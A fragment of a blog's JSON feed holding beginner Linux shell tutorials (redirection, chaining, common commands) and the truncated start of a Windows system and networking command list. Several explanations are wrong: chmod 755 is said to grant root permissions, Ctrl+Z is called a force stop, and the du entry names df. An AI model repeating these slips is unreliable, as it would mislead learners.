class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<h2><i><strong>How to Run a Program in the Background</strong></i></h2>\n<p>Sometimes you’d like to execute a program that might take a while to complete but you don’t want to wait for it to finish. You can use an ampersand for that purpose.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">program &amp;</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>That will run in the program in the background. When it starts, the PID of the new process gets printed to the console and everything, the program outputs to stdout, will also get printed to the console.</p>\n<h2><i><strong>How to Write to and Read From Files</strong></i></h2>\n<p>The results of all programs that output to the stdout stream, can be written to other programs or files. For example, if I wanted to store the list of python scripts in a file, I could do so by typing:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">ls -l | grep <span class=\"hljs-string\">\".*.py$\"</span> &gt; python-scripts.txt</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>This will create (or overwrite) a file called python-scripts.txt that contains the results of the ls command filtered by grep. If you don’t want to overwrite the contents of an existing file, you can use &gt;&gt; to append new text to it instead.</p>\n<p>If you want to feed the contents of a file into a program, you can use the &lt; symbol.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/dd7dEoR/dd7dEoR4FAt6QJZFTtonCaiBIODcLiV7hJUlfpcT.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image9.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>These operators will write to the standard input stream and read from the standard output of a program respectively.</p>\n<h2><i><strong>How to Run Multiple Commands at Once</strong></i></h2>\n<p>Let’s suppose you want to run multiple commands that might take a while to finish. But you don’t want to sit at your computer and wait for them to finish just so that you can enter the next command. Luckily, you can enter a bunch of instructions at once and they’ll be executed one after another while you can enjoy a coffee break.</p>\n<p>To accomplish that, write all commands in one line and separate them with semicolons:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/brAqGHI/brAqGHIl7wNYTzo7MyLzK8lQhnKV9CI7S8xoWQvP.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image10.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>But what if a command fails? Or you only want to execute a command once you can be sure that its predecessor was successful? Those cases are also covered.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">A || B</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>This will run the command A and, if it fails, it will execute B. The following snippet does the exact opposite.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">A &amp;&amp; B</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>This means, that B will only get executed when A was successful. That way, you can string together quite complex commands that almost act like small applications themselves.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<pre class=\"code\"><code class=\"python hljs\">find py-files.txt &amp;&amp; rm py-files.txt; touch py-files.txt &amp;&amp; ls -a | grep <span class=\"hljs-string\">\".*.py$\"</span> &gt;&gt; py-files.txt &amp;&amp; echo <span class=\"hljs-string\">\"File created! The contents are:\"</span> &amp;&amp; cat py-files.txt</code></pre>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>Which will produce the following output:</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/r4iWAEw/r4iWAEwKp0IWf9NgV6oEaeFRVFdQfENV1XRFyfQy.jpeg\" data-is-external-image=\"true\"  alt=\"intermediate_linux_commands_DH_MP_image11.jpg\"></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\"> </div>\n<div class=\"container mt-75px\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"author\">\n<div class=\"media\">\n<figure class=\"media-left\"></figure>\n<div class=\"media-content\"> </div>\n</div>\n</div>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/4/Linux-Termial.jpeg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux Basics"
            ],
            "date_published": "2021-11-16T23:00:55+06:00",
            "date_modified": "2021-11-16T23:03:51+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/learn-basic-commands-for-linux.html",
            "url": "https://sakibulalikhan.github.io/blog/learn-basic-commands-for-linux.html",
            "title": "Learn basic commands for Linux",
            "summary": "What Is Linux? Linux is an operating system's kernel. You might have heard of UNIX. Well, Linux is a UNIX clone. But it&hellip;",
            "content_html": "<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<h3><i><strong>What Is Linux?</strong></i></h3>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/vDDbslT/vDDbslTDGt8itE6C6f8K3X8FPFQenq5iOl1ZfW8z.jpeg\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>Linux is an operating system's kernel. You might have heard of UNIX. Well, Linux is a UNIX clone. But it was actually created by Linus Torvalds from Scratch. Linux is free and open-source, that means that you can simply change anything in Linux and redistribute it in your own name! There are several Linux Distributions, commonly called “distros”.</p>\n<ul>\n<li>Ubuntu Linux</li>\n<li>Red Hat Enterprise Linux</li>\n<li>Linux Mint</li>\n<li>Debian</li>\n<li>Fedora</li>\n</ul>\n<p>Linux is Mainly used in servers. About 90% of the internet is powered by Linux servers. This is because Linux is fast, secure, and free! The main problem of using Windows servers are their cost. This is solved by using Linux servers. The OS that runs in about 80% of the smartphones in the world, Android, is also made from the Linux kernel. Most of the viruses in the world run on Windows, but not on Linux!</p>\n<h3><i><strong>Linux Shell or “Terminal”<br><br></strong></i></h3>\n<p>So, basically, a shell is a program that receives commands from the user and gives it to the OS to process, and it shows the output. Linux's shell is its main part. Its distros come in GUI (graphical user interface), but basically, Linux has a CLI (command line interface). In this tutorial, we are going to cover the basic commands that we use in the shell of Linux.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/CgR0cNL/CgR0cNLK77aJYQHyxQYBKNy1mUv1FN5vBEeGCerZ.jpeg\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p>To open the terminal, press Ctrl+Alt+T in Ubuntu, or press Alt+F2, type in gnome-terminal, and press enter. In Raspberry Pi, type in lxterminal. There is also a GUI way of taking it, but this is better!</p>\n<h3><i><strong>Linux Commands<br><br></strong></i></h3>\n<p><strong>Basic Commands</strong></p>\n<p><strong>1. pwd</strong> — When you first open the terminal, you are in the home directory of your user. To know which directory you are in, you can use the <strong>“pwd”</strong> command. It gives us the absolute path, which means the path that starts from the root. The root is the base of the Linux file system. It is denoted by a forward slash( / ). The user directory is usually something like \"/home/username\".</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/zY0aprE/zY0aprEyMtOxLhiyyRKWvY3vwB9cPJJQtxubemw6.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>2. ls </strong>— Use the <strong>\"ls\"</strong> command to know what files are in the directory you are in. You can see all the hidden files by using the command <strong>“ls -a”</strong>.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/NyJ4zSC/NyJ4zSCkkRu7x2IlvNeDpu9ea4Q7cWDxoB5vLJHk.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>3. cd</strong> — Use the <strong>\"cd\"</strong> command to go to a directory. For example, if you are in the home folder, and you want to go to the downloads folder, then you can type in <strong>“cd Downloads”</strong>. Remember, this command is case sensitive, and you have to type in the name of the folder exactly as it is. But there is a problem with these commands. Imagine you have a folder named “Raspberry Pi”. In this case, when you type in <strong>“cd Raspberry Pi”</strong>, the shell will take the second argument of the command as a different one, so you will get an error saying that the directory does not exist. Here, you can use a backward slash. That is, you can use <strong>“cd Raspberry\\ Pi”</strong> in this case. Spaces are denoted like this: If you just type <strong>“cd”</strong> and press enter, it takes you to the home directory. To go back from a folder to the folder before that, you can type “<strong>cd</strong> ..” . The two dots represent back.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/WAhryqs/WAhryqsvfDeEeyrO2eKIfIvca4C3hSTrSzWXmTFW.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>4. mkdir &amp; rmdir </strong>— Use the <strong>mkdir</strong> command when you need to create a folder or a directory. For example, if you want to make a directory called “DIY”, then you can type <strong>“mkdir DIY</strong>”. Remember, as told before, if you want to create a directory named “DIY Hacking”, then you can type “mkdir <strong>DIY\\ Hacking</strong>”. Use <strong>rmdir</strong> to delete a directory. But <strong>rmdir</strong> can only be used to delete an empty directory. To delete a directory containing files, use <strong>rm</strong>.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/fZHiKDk/fZHiKDkI6X950pnqyFDNLUuVvXnCGE3W2LqLjN3w.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>5. rm</strong> - Use the <strong>rm</strong> command to delete files and directories.  Use \"<strong>rm -r</strong>\" to delete just the directory. It deletes both the folder and the files it contains when using only the <strong>rm</strong> command.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/TVtSlJ0/TVtSlJ0xCOT0TrjQCxdlznSErV7s8ip5D1uQaO29.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>6. touch</strong> — The<strong> touch</strong> command is used to create a file. It can be anything, from an empty txt file to an empty zip file. For example, “<strong>touch new.txt</strong>”.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/xQ2pP99/xQ2pP99oGhjN1fisLfllUSp3BYFne9Gt1hdBAvMX.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>7. man &amp; --help</strong> — To know more about a command and how to use it, use the <strong>man</strong> command. It shows the manual pages of the command. For example, “<strong>man cd</strong>” shows the manual pages of the <strong>cd </strong>command. Typing in the command name and the argument helps it show which ways the command can be used (e.g., <strong>cd –help</strong>).</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/Qxqv1yX/Qxqv1yXm9DdmwS11frqfVthgmSvGCBTwjf7YQ4kw.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>8. cp</strong> — Use the <strong>cp </strong>command to copy files through the command line. It takes two arguments: The first is the location of the file to be copied, the second is where to copy.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/r3Jci3Z/r3Jci3ZGSACziRezSh8vmHiATZ5rFqY8CtOcM4Aj.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>9. mv</strong> — Use the <strong>mv</strong> command to move files through the command line. We can also use the <strong>mv</strong> command to rename a file. For example, if we want to rename the file “<strong>text</strong>” to “<strong>new</strong>”, we can use “<strong>mv text new</strong>”. It takes the two arguments, just like the<strong> cp</strong> command.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/XfrXwxx/XfrXwxxdZUV66PCQdcFLDMkxRw58i6fLGrjjNbcV.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>10. locate</strong> — The <strong>locate</strong> command is used to locate a file in a Linux system, just like the search command in Windows. This command is useful when you don't know where a file is saved or the actual name of the file. Using the -i argument with the command helps to ignore the case (it doesn't matter if it is uppercase or lowercase). So, if you want a file that has the word “hello”, it gives the list of all the files in your Linux system containing the word \"hello\" when you type in “<strong>locate -i hello</strong>”. If you remember two words, you can separate them using an asterisk (*). For example, to locate a file containing the words \"hello\" and \"this\", you can use the command “<strong>locate -i *hello*this”.</strong></p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/OLS3n8S/OLS3n8S30SLUxjlxdmIhd0bHnTc2q12Cy0gudkcU.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>Intermediate Commands</strong></p>\n<p><strong>1. echo </strong>— The \"<strong>echo</strong>\" command helps us move some data, usually text into a file. For example, if you want to create a new text file or add to an already made text file, you just need to type in, “<strong>echo hello, my name is alok &gt;&gt; new.txt</strong>”. You do not need to separate the spaces by using the backward slash here, because we put in two triangular brackets when we finish what we need to write.</p>\n<p><strong>2. cat </strong>— Use the <strong>cat</strong> command to display the contents of a file. It is usually used to easily view programs.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/gVDvnvr/gVDvnvrg4mkmFfoOwfKi5S5QaOo6g71LfokySbUf.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>3. nano, vi, jed — nano</strong> and <strong>vi</strong> are already installed text editors in the Linux command line. The <strong>nano</strong> command is a good text editor that denotes keywords with color and can recognize most languages. And <strong>vi</strong> is simpler than <strong>nano</strong>. You can create a new file or modify a file using this editor. For example, if you need to make a new file named <strong>\"check.txt</strong>\", you can create it by using the command “<strong>nano check.txt</strong>”. You can save your files after editing by using the sequence Ctrl+X, then Y (or N for no). In my experience, using <strong>nano </strong>for HTML editing doesn't seem as good, because of its color, so I recommend <strong>jed </strong>text editor. We will come to installing packages soon.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/6ILW5l3/6ILW5l3cJbunDa4PoZbp3xVLI1FLVCICfs5xCLVZ.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p class=\"\"><strong>4. sudo</strong> — A widely used command in the Linux command line, <strong>sudo</strong> stands for \"SuperUser Do\". So, if you want any command to be done with administrative or root privileges, you can use the <strong>sudo</strong> command. For example, if you want to edit a file like <strong>viz. alsa-base.conf</strong>, which needs root permissions, you can use the command – <strong>sudo nano alsa-base.conf</strong>. You can enter the root command line using the command “<strong>sudo bash</strong>”, then type in your user password. You can also use the command “<strong>su</strong>” to do this, but you need to set a root password before that. For that, you can use the command “<strong>sudo passwd</strong>”(not misspelled, it is <strong>passwd</strong>). Then type in the new root password.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/x87NGMW/x87NGMWw1Cx4b9pqDueExq1BCGRep9qhHTtTIKbF.jpeg\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>5. df </strong>— Use the <strong>df </strong>command to see the available disk space in each of the partitions in your system. You can just type in <strong>df</strong> in the command line and you can see each mounted partition and their used/available space in % and in KBs. If you want it shown in megabytes, you can use the command “<strong>df -m</strong>”.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/pWIgW4d/pWIgW4dtCD3Q4LGDzzL9zfZscTJRsiL3oXpstUn4.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>6. du</strong> — Use <strong>du</strong> to know the disk usage of a file in your system. If you want to know the disk usage for a particular folder or file in Linux, you can type in the command <strong>df</strong> and the name of the folder or file. For example, if you want to know the disk space used by the documents folder in Linux, you can use the command “<strong>du Documents</strong>”. You can also use the command “<strong>ls -lah</strong>” to view the file sizes of all the files in a folder.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/ShrGn4Z/ShrGn4Zdt1uUxAL8ZBEIBdJaB6IFem1fUNgZ9LAI.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>7. tar</strong> — Use <strong>tar</strong> to work with tarballs (or files compressed in a tarball archive) in the Linux command line. It has a long list of uses. It can be used to compress and uncompress different types of tar archives like <strong>.tar, .tar.gz, .tar.bz2</strong>,etc. It works on the basis of the arguments given to it. For example, \"<strong>tar -cvf</strong>\" for creating a <strong>.tar</strong> archive, -<strong>xvf</strong> to untar a tar archive, -<strong>tvf</strong> to list the contents of the archive, etc. Since it is a wide topic, here are some <a href=\"http://www.tecmint.com/18-tar-command-examples-in-linux/\" target=\"_blank\" rel=\"noopener noreferrer\">examples of tar commands</a>.</p>\n<p><strong>8. zip, unzip</strong> — Use <strong>zip</strong> to compress files into a zip archive, and <strong>unzip</strong> to extract files from a zip archive.</p>\n<p><strong>9. uname</strong> — Use <strong>uname</strong> to show the information about the system your Linux distro is running. Using the command “<strong>uname -a</strong>” prints most of the information about the system. This prints the kernel release date, version, processor type, etc.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/zYTWmQm/zYTWmQmaCRIQVP81pRAyGpsQMlODoWfAiBmhGGfx.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>10. apt-get</strong> — Use <strong>apt</strong> to work with packages in the Linux command line. Use <strong>apt-get</strong> to install packages. This requires root privileges, so use the <strong>sudo</strong> command with it. For example, if you want to install the text editor <strong>jed</strong> (as I mentioned earlier), we can type in the command “<strong>sudo apt-get install jed</strong>”. Similarly, any packages can be installed like this. It is good to update your repository each time you try to install a new package. You can do that by typing “<strong>sudo apt-get update</strong>”. You can upgrade the system by typing “<strong>sudo apt-get upgrade</strong>”. We can also upgrade the distro by typing “<strong>sudo apt-get dist-upgrade</strong>”. The command “<strong>apt-cache search</strong>” is used to search for a package. If you want to search for one, you can type in “<strong>apt-cache search jed</strong>”(this doesn't require root).</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/kRl3J9p/kRl3J9prsTdwSLbn0a3Ib0PQ5bO2fQRXZN7Aqs4B.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>11. chmod</strong> — Use <strong>chmod</strong> to make a file executable and to change the permissions granted to it in Linux. Imagine you have a python code named <strong>numbers.py</strong> in your computer. You'll need to run “<strong>python numbers.py</strong>” every time you need to run it. Instead of that, when you make it executable, you'll just need to run “<strong>numbers.py</strong>” in the terminal to run the file. To make a file executable, you can use the command “<strong>chmod +x numbers.py</strong>” in this case. You can use “<strong>chmod 755 numbers.py</strong>” to give it root permissions or “<strong>sudo chmod +x numbers.py</strong>” for root executable. Here is some more <a href=\"http://www.computerhope.com/unix/uchmod.htm\" target=\"_blank\" rel=\"noopener noreferrer\">information about the chmod command</a>.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/x6kPLV1/x6kPLV1X082T8Ndad9HXUcoUTfHqh3ZwdJeNMOWN.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>12. hostname</strong> — Use <strong>hostname</strong> to know your name in your host or network. Basically, it displays your hostname and IP address. Just typing “<strong>hostname</strong>” gives the output. Typing in “<strong>hostname -I</strong>” gives you your IP address in your network.</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/rYXwfkj/rYXwfkjzSMxuSpV8CeNvMze4kqJNIpw1QVcOT6eY.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<p><strong>13. ping</strong> — Use <strong>ping</strong> to check your connection to a server. Wikipedia says, \"<strong>Ping</strong> is a computer network administration software utility used to test the reachability of a host on an Internet Protocol (IP) network\". Simply, when you type in, for example, “<strong>ping google.com</strong>”, it checks if it can connect to the server and come back. It measures this round-trip time and gives you the details about it. The use of this command for simple users like us is to check your internet connection. If it pings the Google server (in this case), you can confirm that your internet connection is active!</p>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<div class=\"content-image\">\n<div class=\"wrapper\"><img loading=\"lazy\" src=\"https://maker.pro/storage/bTyR2iO/bTyR2iOeEwWRqxaKg5KR00sANOT3M8VlKAzkiprJ.png\" data-is-external-image=\"true\"  alt=\"\"></div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"container\">\n<div class=\"columns\">\n<div class=\"column is-8 is-offset-2\">\n<h3><i><strong>Tips and Tricks for Using Linux Command Line<br><br></strong></i></h3>\n<ul>\n<li>You can use the <strong>clear</strong> command to clear the terminal if it gets filled up with too many commands.</li>\n<li><strong>TAB</strong> can be used to fill up in terminal. For example, You just need to type “<strong>cd Doc</strong>” and then <strong>TAB</strong> and the terminal fills the rest up and makes it “<strong>cd Documents</strong>”.</li>\n<li><strong>Ctrl+C</strong> can be used to stop any command in terminal safely. If it doesn't stop with that, then <strong>Ctrl+Z</strong> can be used to force stop it.</li>\n<li>You can exit from the terminal by using the <strong>exit</strong> command.</li>\n<li>You can power off or reboot the computer by using the command <strong>sudo halt</strong> and <strong>sudo reboot</strong>.</li>\n</ul>\n</div>\n</div>\n</div>",
            "image": "https://sakibulalikhan.github.io/blog/media/posts/3/Linux.jpeg",
            "author": {
                "name": "Sakibul Ali Khan"
            },
            "tags": [
                   "Linux Basics"
            ],
            "date_published": "2021-11-16T22:47:49+06:00",
            "date_modified": "2021-11-16T23:01:04+06:00"
        },
        {
            "id": "https://sakibulalikhan.github.io/blog/windows-system-and-networking-commands.html",
            "url": "https://sakibulalikhan.github.io/blog/windows-system-and-networking-commands.html",
            "title": "Windows System and Networking commands",
            "summary": "Windows System and Networking commands Introduction In this blog post, we will learn some windows networking and system commands which we will use&hellip;",
            "content_html": "<h2><figure class=\"post__image\"><img loading=\"lazy\"  src=\"https://sakibulalikhan.github.io/blog/media/posts/2/powershell-2.png\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-xs.png 300w ,https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-sm.png 480w ,https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-md.png 768w ,https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-lg.png 1024w ,https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-xl.png 1360w ,https://sakibulalikhan.github.io/blog/media/posts/2/responsive/powershell-2-2xl.png 1600w\"  alt=\"Windows PowerShell\" width=\"1920\" height=\"1080\"></figure></h2>\n<h2 id=\"windows-system-and-networking-commands\">Windows System and Networking commands</h2>\n<h2 id=\"introduction\">Introduction</h2>\n<p>In this blog post, we will learn some windows networking and system commands which we will use ahead.</p>\n<h2 id=\"commands\">Commands</h2>\n<p><strong>1. whoami:</strong> It lists your current user.</p>\n<p><strong>2. whoami/all:</strong> It Lists current user, sid,groups the current user is a member of and their sids as well as current privilege level.</p>\n<p><strong>3. set:</strong> It will show all environment variables like USERDOMAIN, USERNAME, USERPROFILE, HOMEPATH, LOGONSERVER, COMPUTERNAME, APPDATA, and ALLUSERPROFILE</p>\n<p><strong>4. systeminfo:</strong> It will show the information about the system, including hostname, domain, logon server, timezone, network interface config,and hotfixes installed.</p>\n<p><strong>6. qwinsta:</strong> It will display information about RDP session in the host.</p>\n<p><strong>7. schtasks/at:</strong> Lists all the currently scheduled tasks that your current user has access to see.</p>\n<p><strong>8. netstart/sc :</strong> It will list services.</p>\n<p><strong>9. tasklist:</strong> It will list all windows tasks</p>\n<p><strong>10. taskkill:</strong> It can kill any process by pid or taskname</p>\n<p><strong>11. netstat:</strong> This will show network connections information, 